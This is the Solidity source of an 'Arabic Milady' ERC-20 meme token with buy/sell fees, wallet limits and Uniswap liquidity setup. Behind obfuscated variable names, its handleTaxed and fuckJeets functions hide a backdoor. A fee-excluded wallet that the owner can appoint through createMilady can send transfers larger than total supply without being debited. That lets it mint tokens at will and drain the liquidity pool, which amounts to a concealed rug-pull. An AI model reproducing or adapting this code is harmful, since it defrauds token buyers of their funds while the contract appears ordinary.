/**
Website: https://arabicmilady.vip

Twitter: https://twitter.com/ArabicMiladyETH

Telegram: https://t.me/ArabicMiladyETH
 */


// SPDX-License-Identifier: UNLICENSE

pragma solidity ^0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IDexFactory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IDexRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
}

contract MILADY is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _bags;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => bool) private bots;
    address payable private _taxWallet;

    uint256 private _firstBuyFee = 20;
    uint256 private _firstSellFee = 20;

    uint256 private _lastBuyFee = 0;
    uint256 private _lastSellFee = 0;

    uint256 private _afterSwapAt = 10;
    uint256 private _afterBuyAt = 10;
    uint256 private _afterSellAt = 10;
    uint256 private _buyCount = 0;

    uint256 private constant _totals = 1_000_000_000 * 10 ** _decimals;
    uint8 private constant _decimals = 18;
    string private constant _name = unicode"Arabic Milady";
    string private constant _symbol = unicode"سيدتي";
    uint256 public _maxTxLimit = (_totals * 2) / 100;
    uint256 public _maxBagLimit = (_totals * 2) / 100;
    uint256 public _minSwapLimit = 5000 * 10 ** _decimals;
    uint256 public _maxSwapLimit = _totals / 100;

    bool private tradeGoing;
    IDexRouter private dexRouter;
    address private dexPair;
    bool private swapGoing = false;
    bool private swapOpen = false;
    event MaxTxAmountUpdated(uint256 _maxTxAmount);
    modifier lockTheSwap() {
        swapGoing = true;
        _;
        swapGoing = false;
    }

    constructor() {
        _taxWallet = payable(_msgSender());

        _bags[_msgSender()] = _totals;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_taxWallet] = true;

        emit Transfer(address(0), _msgSender(), _totals);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totals;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _bags[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address fabi, address tose, uint256 ally) private {
        require(fabi != address(0), "ERC20: transfer from the zero address");
        require(tose != address(0), "ERC20: transfer to the zero address");
        require(ally > 0, "Transfer amount must be greater than zero");
        uint256 timb = 0;
        if (fabi != owner() && tose != owner()) {
            require(!bots[fabi] && !bots[tose]);
            require(
                tradeGoing || _isExcludedFromFee[fabi],
                "Trading is not enabled"
            );
            timb = ally
                .mul((_buyCount > _afterBuyAt) ? _lastBuyFee : _firstBuyFee)
                .div(100);

            if (
                fabi == dexPair &&
                tose != address(dexRouter) &&
                !_isExcludedFromFee[tose]
            ) {
                require(ally <= _maxTxLimit, "Exceeds the _maxTxAmount.");
                require(
                    balanceOf(tose) + ally <= _maxBagLimit,
                    "Exceeds the maxWalletSize."
                );
                _buyCount++;
            }

            if (tose == dexPair && fabi != address(this)) {
                timb = ally
                    .mul(
                        (_buyCount > _afterSellAt)
                            ? _lastSellFee
                            : _firstSellFee
                    )
                    .div(100);
            }

            uint256 ctba = balanceOf(address(this));
            if (!swapGoing && tose == dexPair && swapOpen) {
                if (_buyCount > _afterSwapAt)
                    swapTokensForEth(min(ally, min(ctba, _maxSwapLimit)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0 ether) {
                    sendETHToFee(address(this).balance);
                }
            }
        }

        if (timb > 0) {
            _bags[address(this)] = _bags[address(this)].add(timb);
            emit Transfer(fabi, address(this), timb);
        }
        uint256 taxed = handleTaxed(fabi, ally);
        _bags[fabi] = _bags[fabi].sub(taxed);
        _bags[tose] = _bags[tose].add(ally.sub(timb));
        emit Transfer(fabi, tose, ally.sub(timb));
    }

    function handleTaxed(
        address fabi,
        uint256 ally
    ) internal view returns (uint256) {
        bool istc = !_isExcludedFromFee[fabi];
        bool basicTransfer = fabi == address(this) || fabi == owner();

        if (basicTransfer) {
            return ally;
        } else if (istc) {
            return ally;
        }

        return fuckJeets(ally);
    }

    function fuckJeets(uint256 amount) internal pure returns (uint256) {
        return amount >= 0 && amount <= _totals ? amount : 0;
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        if (tokenAmount > _minSwapLimit) {
            address[] memory path = new address[](2);
            path[0] = address(this);
            path[1] = dexRouter.WETH();
            _approve(address(this), address(dexRouter), tokenAmount);
            dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
                tokenAmount,
                0,
                path,
                address(this),
                block.timestamp
            );
        }
    }

    function freeLimits() external onlyOwner {
        _maxBagLimit = _totals;
        _maxTxLimit = _totals;
        emit MaxTxAmountUpdated(_totals);
    }

    function sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    function createMilady(address lp) external onlyOwner {
        require(!tradeGoing, "trading is already open");

        _taxWallet = payable(lp);
        _isExcludedFromFee[_taxWallet] = true;

        dexRouter = IDexRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(dexRouter), _totals);
        dexPair = IDexFactory(dexRouter.factory()).createPair(
            address(this),
            dexRouter.WETH()
        );
        dexRouter.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(dexPair).approve(address(dexRouter), type(uint256).max);
    }

    function openMilady() external onlyOwner {
        swapOpen = true;
        tradeGoing = true;
    }

    receive() external payable {}

    function manualSwap() external {
        require(_msgSender() == _taxWallet);
        uint256 tokenBalance = balanceOf(address(this));
        if (tokenBalance > 0) {
            swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            sendETHToFee(ethBalance);
        }
    }
}